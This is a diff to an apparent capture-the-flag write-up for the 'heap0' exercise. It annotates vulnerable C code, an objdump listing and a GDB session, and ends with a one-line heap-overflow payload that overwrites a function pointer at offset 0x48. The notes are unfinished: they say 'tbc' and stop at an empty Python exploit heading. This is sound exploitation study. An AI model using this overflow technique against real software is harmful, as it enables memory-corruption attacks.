@@ -1387,22 +1387,79 @@ int main(int argc, char **argv)
 
   d = malloc(sizeof(struct data));
   f = malloc(sizeof(struct fp));
-  f->fp = nowinner;
+  f->fp = nowinner;    // sets function pointer to no winner, we will change this
 
   printf("data is at %p, fp is at %p\n", d, f);
 
-  strcpy(d->name, argv[1]);
+  strcpy(d->name, argv[1]);  // where we overflow struct d to overwrite fp
   
-  f->fp();
+  f->fp();                  // where fp is called
 
 }
 ```
 
 ###Plan:
 
+First heap exercise
+
+So we check out the objdump and see the following things of interest
+```asm
+08048464 <winner>:                              <- location we need to jump to
+ 8048464:	55                   	push   %ebp
+ 8048465:	89 e5                	mov    %esp,%ebp
+ 8048467:	83 ec 18             	sub    $0x18,%esp
+ 804846a:	c7 04 24 d0 85 04 08 	movl   $0x80485d0,(%esp)
+ 8048471:	e8 22 ff ff ff       	call   8048398 <puts@plt>
+ 8048476:	c9                   	leave  
+ 8048477:	c3                   	ret   
+ 
+ 0804848c <main>:
+ 804848c:	55                   	push   %ebp
+ 804848d:	89 e5                	mov    %esp,%ebp
+ ...
+ 80484f2:	e8 71 fe ff ff       	call   8048368 <strcpy@plt>
+ 80484f7:	8b 44 24 1c          	mov    0x1c(%esp),%eax  <-- moves a ptr into eax   we'll set our breakpoint here
+ 80484fb:	8b 00                	mov    (%eax),%eax   < -- loads value from that ptr into eax
+ 80484fd:	ff d0                	call   *%eax          < --- calls function at location in eax
+ 80484ff:	c9                   	leave  
+ 8048500:	c3                   	ret
+```
+So we fire up GDB and check out the heap
+```bash
+$ gdb ./heap0
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Reading symbols from ./heap0...done.
+gdb$ b *0x80484f7                         #set our breakpoint
+Breakpoint 1 at 0x80484f7: file heap0/heap0.c, line 38.
+gdb$ run aaaaaaaaaaaa                     #run with some garbage
+gdb$ x/10wx $esp                 #check out our stack 
+                                                      v-----------location moved to eax 
+0xffffd090:     0x0804a008      0xffffd38e      0x0804a050      0xf7e494ad
+0xffffd0a0:     0xf7fc13c4      0xf7ffd000      0x0804a008      0x0804a050
+gdb$ x/20wx $eax                                #check out our heap                                                                     
+0x804a008:      0x61616161      0x61616161      0x61616161      0x61616161
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a048:      0x00000000      0x00000011      0x08048478      0x00000000
+                                                    ^----- our target to overwrite (*fp)
+```
+So now we just need to overflow our heap chunk to overwrite fp
+
+```bash
+gdb$ x $esp+0x1c
+0xffffd0ac:     0x0804a050   <--- overwrite loc
+gdb$ p $eax                   <--- start of heap chunk
+$3 = 0x804a008
+gdb$ p 0x0804a050-$eax
+$4 = 0x48             <--- offset!
+gdb$ 
+```
+tbc
 
 ###winning command:
 ```bash
+./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
 ```
 ###Python exploit:
 ```Python
